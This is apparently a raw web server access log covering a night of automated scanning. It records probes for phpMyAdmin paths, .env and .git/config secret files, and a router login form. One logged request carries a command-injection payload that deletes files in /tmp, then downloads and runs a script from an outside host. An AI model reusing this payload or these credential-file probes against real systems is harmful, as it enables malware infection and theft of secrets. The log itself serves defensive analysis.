217.217.8.209 - - [13/Jan/2023:17:30:37 -0600] "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:37 -0600] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:38 -0600] "GET /sql/php-myadmin/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:38 -0600] "GET /phpmyadmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:38 -0600] "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:38 -0600] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:39 -0600] "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:39 -0600] "GET /mysql/web/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:40 -0600] "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:40 -0600] "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.1" 301 280 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:40 -0600] "GET /sql/sql-admin/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:40 -0600] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:41 -0600] "GET /sql/webdb/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:41 -0600] "GET /1phpmyadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:41 -0600] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:41 -0600] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:42 -0600] "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:42 -0600] "GET /phpmyadmin2014/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:43 -0600] "GET /phpMyAdmin_/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:43 -0600] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:44 -0600] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:44 -0600] "GET /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php?lang=en HTTP/1.1" 301 299 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:44 -0600] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:45 -0600] "GET /phpMyAdmin/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:45 -0600] "GET /pma/index.php?lang=en HTTP/1.1" 301 253 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:45 -0600] "GET /database/index.php?lang=en HTTP/1.1" 301 258 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:45 -0600] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:46 -0600] "GET /phpmyadmin_/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:47 -0600] "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:47 -0600] "GET /db/phpMyAdmin3/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:48 -0600] "GET /phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:48 -0600] "GET /phpMyAdmin5.1/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:48 -0600] "GET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.1" 301 281 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:49 -0600] "GET /db/phpmyadmin3/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:49 -0600] "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:51 -0600] "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.1" 301 266 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:51 -0600] "GET /phpMyAdmin5.1/index.php?lang=en HTTP/1.1" 301 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:52 -0600] "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.1" 301 274 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:52 -0600] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:52 -0600] "GET /2phpmyadmin/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:52 -0600] "GET /db/phpMyAdmin-4/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:53 -0600] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:53 -0600] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:54 -0600] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 301 265 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:55 -0600] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:55 -0600] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:55 -0600] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:55 -0600] "GET /sqlmanager/index.php?lang=en HTTP/1.1" 301 260 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:56 -0600] "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:56 -0600] "GET /phpmyadmin2015/index.php?lang=en HTTP/1.1" 301 264 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:57 -0600] "GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.1" 301 281 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:57 -0600] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:58 -0600] "GET /phpmyadmin4/index.php?lang=en HTTP/1.1" 301 261 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:58 -0600] "GET /index.php?lang=en HTTP/1.1" 301 249 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:59 -0600] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 301 259 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
217.217.8.209 - - [13/Jan/2023:17:30:59 -0600] "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 301 262 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
152.89.196.211 - - [13/Jan/2023:17:32:49 -0600] "GET /actuator/gateway/routes HTTP/1.1" 301 255 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
128.14.141.34 - - [13/Jan/2023:17:56:00 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
143.110.222.166 - - [13/Jan/2023:18:09:30 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
205.185.118.237 - - [13/Jan/2023:18:13:58 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
2a06:4880:3000::3b - - [13/Jan/2023:18:51:21 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
143.110.222.166 - - [13/Jan/2023:19:08:02 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
182.253.162.61 - - [13/Jan/2023:19:11:23 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
201.172.238.94 - - [13/Jan/2023:19:27:07 -0600] "GET /robots.txt HTTP/1.1" 301 251 "-" "Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36"
223.240.101.111 - - [13/Jan/2023:19:58:17 -0600] "GET / HTTP/1.1" 301 241 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
14.29.181.90 - - [13/Jan/2023:19:58:45 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
143.110.222.166 - - [13/Jan/2023:20:09:48 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
185.254.196.223 - - [13/Jan/2023:20:26:11 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Jan/2023:20:26:11 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.68.90.220 - - [13/Jan/2023:20:29:34 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.68.90.220 - - [13/Jan/2023:20:29:34 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.159.152.255 - - [13/Jan/2023:20:44:52 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:104.0) Gecko/20100101 Firefox/104.0"
143.110.222.166 - - [13/Jan/2023:21:08:47 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
205.185.118.237 - - [13/Jan/2023:21:26:36 -0600] "POST /boaform/admin/formLogin HTTP/1.1" 301 255 "http://194.195.210.97:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
143.110.222.166 - - [13/Jan/2023:22:06:31 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
117.199.173.153 - - [13/Jan/2023:22:14:28 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
172.174.208.161 - - [13/Jan/2023:22:19:43 -0600] "GET /.git/config HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
45.190.158.7 - - [13/Jan/2023:22:22:16 -0600] "GET / HTTP/1.1" 400 226 "-" "-"
143.110.222.166 - - [13/Jan/2023:23:06:51 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
64.62.197.165 - - [13/Jan/2023:23:15:53 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
64.62.197.158 - - [13/Jan/2023:23:17:27 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15"
64.62.197.163 - - [13/Jan/2023:23:18:09 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53"
185.254.196.223 - - [13/Jan/2023:23:24:43 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Jan/2023:23:24:43 -0600] "POST / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2001:470:1:c84::150 - - [13/Jan/2023:23:37:43 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; rv:104.0) Gecko/20100101 Firefox/104.0"
2001:470:1:c84::155 - - [13/Jan/2023:23:46:34 -0600] "GET / HTTP/1.1" 301 232 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
2001:470:1:c84::143 - - [13/Jan/2023:23:46:41 -0600] "GET /favicon.ico HTTP/1.1" 301 243 "-" "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:100.0) Gecko/20100101 Firefox/100.0"
179.48.127.1 - - [13/Jan/2023:23:55:10 -0600] "GET /shell?cd+/tmp;rm+-rf+*;wget+heylitimysun.top/jaws;sh+/tmp/jaws HTTP/1.1" 301 294 "-" "Hello, world"
92.118.39.29 - - [14/Jan/2023:00:03:16 -0600] "GET / HTTP/1.1" 301 232 "-" "-"
18.246.4.134 - - [14/Jan/2023:00:04:40 -0600] "GET /.env HTTP/1.1" 301 236 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:40 -0600] "GET /conf/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:40 -0600] "GET /wp-content/.env HTTP/1.1" 301 247 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:40 -0600] "GET /wp-admin/.env HTTP/1.1" 301 245 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:40 -0600] "GET /library/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:40 -0600] "GET /new/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:40 -0600] "GET /vendor/.env HTTP/1.1" 301 243 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:41 -0600] "GET /old/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:41 -0600] "GET /local/.env HTTP/1.1" 301 242 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:41 -0600] "GET /api/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:41 -0600] "GET /blog/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:41 -0600] "GET /crm/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:41 -0600] "GET /admin/.env HTTP/1.1" 301 242 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:41 -0600] "GET /laravel/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:42 -0600] "GET /app/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:42 -0600] "GET /app/config/.env HTTP/1.1" 301 247 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:42 -0600] "GET /apps/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:42 -0600] "GET /audio/.env HTTP/1.1" 301 242 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:42 -0600] "GET /cgi-bin/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:42 -0600] "GET /backend/.env HTTP/1.1" 301 244 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:42 -0600] "GET /src/.env HTTP/1.1" 301 240 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
18.246.4.134 - - [14/Jan/2023:00:04:43 -0600] "GET /base/.env HTTP/1.1" 301 241 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36"
